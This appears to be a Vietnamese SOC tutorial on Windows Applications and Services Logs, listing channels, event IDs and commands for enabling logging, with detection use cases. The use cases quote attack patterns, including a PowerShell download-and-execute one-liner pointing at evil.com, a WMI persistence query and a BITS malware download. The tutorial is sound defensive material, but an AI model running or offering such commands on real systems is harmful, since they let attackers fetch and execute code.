## Applications and Services Logs là gì?

Applications and Services Logs là nhóm log thứ 2 trong Windows Event Log — xuất hiện từ **Windows Vista trở đi**, bổ sung cho 5 Windows Logs truyền thống.

Khác với Windows Logs ghi sự kiện ảnh hưởng toàn hệ thống, Applications and Services Logs ghi sự kiện **của riêng từng component, service, hoặc ứng dụng cụ thể**.

```
Event Viewer
├── Windows Logs            ← 5 log cố định (Security, System, Application, Setup, Forwarded)
└── Applications and Services Logs  ← số lượng không cố định, tùy máy
    └── Microsoft
        └── Windows
            ├── Sysmon/Operational
            ├── PowerShell/Operational
            ├── Windows Defender/Operational
            └── ...350+ channel khác
```

---

## Ai ghi vào Applications and Services Logs?

Mỗi component tự đăng ký channel riêng của mình:

|Loại|Ví dụ channel|Ai ghi|
|---|---|---|
|Windows built-in component|PowerShell, Defender, TaskScheduler|Microsoft|
|Third-party tool cài thêm|Sysmon, OpenSSH|Vendor/Community|
|Role được cài trên Server|IIS, DNS, DHCP|Microsoft|
|Ứng dụng tự tạo|Visual Studio, OAlerts|Developer|

**Số lượng thực tế:** Chạy lệnh dưới đây để xem máy có bao nhiêu channel:

powershell

```powershell
(Get-WinEvent -ListLog * | Where-Object {
    $_.LogName -notmatch "^(Application|Security|System|Setup|ForwardedEvents)$"
}).Count
```

Thường từ **300-500+ channel** tùy cấu hình máy.

---

## 4 Subtype của mỗi channel

Mỗi component có thể có tối đa 4 loại log:

|Subtype|Mục đích|Mặc định|
|---|---|---|
|**Admin**|Sự kiện dành cho admin xử lý — có action rõ ràng|Thường bật|
|**Operational**|Theo dõi hoạt động — dùng để phân tích và diagnose|Thường bật|
|**Analytic**|Volume cao — ghi chi tiết từng hoạt động|**Tắt mặc định**|
|**Debug**|Dành cho developer debug|**Tắt mặc định**|

SOC chủ yếu dùng **Operational** — đây là subtype có giá trị nhất cho điều tra.

---

## Applications and Services Logs cover gì — theo nhóm SOC

### Nhóm 1: Execution — phát hiện code được thực thi

#### PowerShell/Operational

```
Path: Microsoft-Windows-PowerShell/Operational
File: C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
Mặc định: Bật — nhưng Script Block Logging phải bật thêm
```

|Event ID|Sự kiện|Event Type|
|---|---|---|
|**4103**|Module logging — pipeline execution|Information|
|**4104**|Script block logging — toàn bộ nội dung script|Warning/Information|
|**4105**|Script block start|Information|
|**4106**|Script block stop|Information|

**Phải bật thêm để có 4104:**

```
gpedit.msc → Computer Configuration → Administrative Templates
→ Windows Components → Windows PowerShell
→ "Turn on Script Block Logging"  → Enabled
→ "Turn on Module Logging"        → Enabled
```

#### WMI-Activity/Operational

```
Path: Microsoft-Windows-WMI-Activity/Operational
Mặc định: Bật
```

|Event ID|Sự kiện|Event Type|
|---|---|---|
|**5857**|WMI provider được load|Information|
|**5858**|WMI query error|Error|
|**5860**|Temporary WMI event subscription|Information|
|**5861**|Permanent WMI event subscription|Information|

---

### Nhóm 2: Persistence — phát hiện duy trì chỗ đứng

#### TaskScheduler/Operational

```
Path: Microsoft-Windows-TaskScheduler/Operational
Mặc định: TẮT — phải bật thủ công
```

|Event ID|Sự kiện|Event Type|
|---|---|---|
|**106**|Task mới được đăng ký|Information|
|**140**|Task bị update|Information|
|**141**|Task bị xóa|Information|
|**200**|Task action bắt đầu chạy|Information|
|**201**|Task action hoàn thành|Information|

**Cách bật:**

powershell

```powershell
wevtutil set-log "Microsoft-Windows-TaskScheduler/Operational" /enabled:true
```

---

### Nhóm 3: Defense Evasion — phát hiện bypass bảo mật

#### Windows Defender/Operational

```
Path: Microsoft-Windows-Windows Defender/Operational
Mặc định: Bật
```

|Event ID|Sự kiện|Event Type|
|---|---|---|
|**1116**|Malware được phát hiện|Warning|
|**1117**|Action được thực hiện với malware|Information|
|**1118**|Action thất bại|Warning|
|**1013**|Malware history bị xóa|Information|
|**5001**|Real-time protection bị tắt|Error|
|**5004**|Real-time protection config thay đổi|Warning|
|**5007**|Antivirus config thay đổi|Warning|

#### AppLocker

```
Path: Microsoft-Windows-AppLocker/EXE and DLL
      Microsoft-Windows-AppLocker/MSI and Script
Mặc định: Bật (nếu AppLocker được cấu hình)
```

|Event ID|Sự kiện|Event Type|
|---|---|---|
|**8003**|File được phép chạy (audit mode)|Information|
|**8004**|File bị block|Warning|
|**8005**|Script được phép chạy|Information|
|**8006**|Script bị block|Warning|

#### CodeIntegrity/Operational

```
Path: Microsoft-Windows-CodeIntegrity/Operational
Mặc định: Bật
```

|Event ID|Sự kiện|Event Type|
|---|---|---|
|**3001**|Driver không có chữ ký bị load|Warning|
|**3002**|Driver unsigned bị block|Error|
|**3004**|File không pass integrity check|Warning|

---

### Nhóm 4: Lateral Movement — phát hiện di chuyển ngang

#### TerminalServices-LocalSessionManager/Operational

```
Path: Microsoft-Windows-TerminalServices-LocalSessionManager/Operational
Mặc định: Bật
```

|Event ID|Sự kiện|Event Type|
|---|---|---|
|**21**|RDP session login thành công|Information|
|**22**|RDP shell session tạo mới|Information|
|**23**|RDP session logout|Information|
|**24**|RDP session disconnect|Information|
|**25**|RDP session reconnect|Information|

#### TerminalServices-RemoteConnectionManager/Operational

```
Path: Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational
Mặc định: Bật
```

|Event ID|Sự kiện|Event Type|
|---|---|---|
|**1149**|RDP authentication thành công — user và IP nguồn|Information|

#### WinRM/Operational

```
Path: Microsoft-Windows-WinRM/Operational
Mặc định: Bật
```

Ghi lại PowerShell Remoting và WinRM connection — dùng cho lateral movement qua `Enter-PSSession` hoặc `Invoke-Command`.

---

### Nhóm 5: Command & Control — phát hiện kết nối C2

#### DNS-Client/Operational

```
Path: Microsoft-Windows-DNS-Client/Operational
Mặc định: TẮT — phải bật thủ công
```

Ghi lại **toàn bộ DNS query** từ máy — biết process nào query domain gì. Backup quan trọng khi không có Sysmon Event 22.

powershell

```powershell
wevtutil set-log "Microsoft-Windows-DNS-Client/Operational" /enabled:true
```

#### Windows Firewall/Firewall

```
Path: Microsoft-Windows-Windows Firewall With Advanced Security/Firewall
Mặc định: Bật
```

|Event ID|Sự kiện|SOC note|
|---|---|---|
|**2004**|Firewall rule mới được thêm|Attacker mở port|
|**2006**|Firewall rule bị xóa||
|**2009**|Firewall rule thay đổi||

#### Bits-Client/Operational

```
Path: Microsoft-Windows-Bits-Client/Operational
Mặc định: Bật
```

|Event ID|Sự kiện|SOC note|
|---|---|---|
|**16403**|BITS job tạo mới|T1197 — download malware qua BITS|

---

### Nhóm 6: Credential Access — phát hiện đánh cắp credential

#### NTLM/Operational

```
Path: Microsoft-Windows-NTLM/Operational
Mặc định: TẮT — phải bật thủ công
```

|Event ID|Sự kiện|SOC note|
|---|---|---|
|**8001**|NTLM authentication thành công||
|**8002**|NTLM authentication thất bại|Nhiều lần = NTLM brute force|
|**8004**|Domain controller denied NTLM||

powershell

```powershell
wevtutil set-log "Microsoft-Windows-NTLM/Operational" /enabled:true
```

#### LSA/Operational

```
Path: Microsoft-Windows-LSA/Operational
Mặc định: TẮT
```

Ghi lại hoạt động của Local Security Authority — liên quan trực tiếp đến credential dumping từ LSASS.

---

## Event Type trong Applications and Services Logs

Giống System Log và Application Log — không có Success/Failure Audit:

|Type|Khi nào|Ví dụ|
|---|---|---|
|**Error**|Sự kiện nghiêm trọng|Real-time protection fail, unsigned driver block|
|**Warning**|Cần chú ý|Malware detected, script block logged|
|**Information**|Hoạt động bình thường|Task chạy, RDP connect|

---

## Field cốt lõi

**Common fields — luôn có:**

|Field|Ý nghĩa|SOC note|
|---|---|---|
|**EventID**|Loại sự kiện|Khác nhau theo từng channel|
|**TimeCreated**|Thời điểm xảy ra|Dùng để build timeline|
|**Level**|Error / Warning / Information|Filter theo mức độ|
|**Provider/Source**|Channel nào sinh log|Phải biết cả channel lẫn EventID|
|**Computer**|Tên máy||
|**Message**|Nội dung mô tả|Đọc để hiểu context|

**Event-specific fields quan trọng nhất:**

|Field|Xuất hiện trong|Ý nghĩa|
|---|---|---|
|**ScriptBlockText**|PowerShell 4104|Toàn bộ nội dung script — quan trọng nhất|
|**Path**|PowerShell 4104|File script được chạy|
|**ThreatName**|Defender 1116|Tên malware|
|**DetectionSource**|Defender 1116|Phát hiện từ đâu|
|**TaskName**|TaskScheduler 106|Tên task được tạo|
|**TaskContent**|TaskScheduler 106|Nội dung XML của task|
|**User**|TerminalServices 21|Account login RDP|
|**Address**|TerminalServices 21|IP nguồn kết nối RDP|
|**Consumer**|WMI 5861|WMI consumer được đăng ký|
|**Query**|WMI 5861|WMI query filter|

---

## So sánh 3 nhóm log chính

||Windows Logs|Applications and Services Logs|
|---|---|---|
|Số lượng|5 log cố định|300-500+ channel tùy máy|
|Tồn tại từ|Windows NT 3.1|Windows Vista trở đi|
|Scope|Toàn hệ thống|Từng component riêng|
|EventID|Chuẩn, nhất quán|Mỗi channel tự định nghĩa|
|Mặc định|Hầu hết bật|Nhiều channel tắt|
|Filter Wazuh|Tên ngắn: `Security`, `System`|Full path: `Microsoft-Windows-PowerShell/Operational`|

---

## Use case SOC

### Detect PowerShell attack — fileless malware

```
Pattern:
PowerShell 4104 (Script Block):
  ScriptBlockText = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
  Path = (không có — chạy trực tiếp trong memory)

= Fileless attack — download và chạy script trong memory
  không có file trên disk để AV scan
→ Chỉ Script Block Logging mới bắt được
```

### Detect WMI persistence

```
Pattern:
WMI 5861 (Permanent subscription):
  Consumer = "ActiveScriptEventConsumer"
  Query = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 3"

= WMI persistence chạy script lúc 3 giờ sáng mỗi ngày — T1546.003
  Tồn tại dù reboot máy
```

### Detect Defender bị tắt trước khi tấn công

```
Pattern:
Defender 5001: Real-time protection disabled
    → Sau đó không có alert nào từ Defender
    → Kali bắt đầu tấn công

= Attacker tắt AV trước — sequence này rất đặc trưng
→ Correlate với System 7045 xem có service lạ nào cài sau đó không
```

### Detect lateral movement qua RDP

```
Pattern:
TerminalServices 1149: User = "Administrator", Address = "192.168.10.5"
TerminalServices 21:   User = "Administrator" — session tạo thành công

= RDP login từ máy 192.168.10.5 vào máy này
→ Correlate với Security 4624 LogonType 10 để xác nhận
→ Kiểm tra máy 192.168.10.5 có bị compromise không
```

### Detect BITS abuse — download malware lén lút

```
Pattern:
Bits-Client 16403: JobTitle = "Windows Update"
                    FileUrl = "http://185.x.x.x/malware.exe"
                    LocalFile = "C:\Users\Public\svchost.exe"

= Attacker dùng BITS (trusted Windows component) để download malware
  BITS chạy dưới SYSTEM — bypass nhiều security tool
  URL trỏ về IP lạ dù JobTitle giả mạo "Windows Update"
```